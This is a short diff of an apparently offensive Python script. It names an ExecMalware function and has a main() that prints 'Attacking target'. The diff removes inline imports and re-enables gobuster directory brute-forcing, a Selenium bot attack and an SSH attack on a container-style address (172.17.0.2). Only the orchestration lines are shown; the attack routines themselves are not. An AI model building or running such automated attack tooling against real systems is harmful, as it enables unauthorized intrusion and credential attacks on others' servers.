@@ -184,30 +184,12 @@ def ExecMalware():
 
 
 def main(target):
-    import queue
-    import threading
-    import os
-    import requests
-    from urllib.request import urlopen, Request
-    from urllib.error import HTTPError
-    from bs4 import BeautifulSoup
-    from urllib import request
-    import urllib.request, urllib.error, urllib.parse
-    import re
-    from selenium import webdriver
-    import time
-    import paramiko
-    from collections import deque
-    import sys
-    import urllib3
-    from selenium.webdriver.chrome.service import Service
-    from selenium.webdriver.common.by import By
     S = MySpider()
     print("Attacking target: ",target)
     time.sleep(1)
     print("starting Spyder attack @: ",target)
     time.sleep(1)
-    #S.mygobuster(target)
+    S.mygobuster(target)
     time.sleep(1)
     print("crawlin css files..")
     time.sleep(1)
@@ -215,7 +197,7 @@ def main(target):
     time.sleep(1)
     print("starting Selenium Bot attack @: ",target)
     time.sleep(1)
-    #S.myBot()
+    S.myBot()
     time.sleep(1)
     print("start attacking ssh @: ",target)
     attackssh("172.17.0.2")
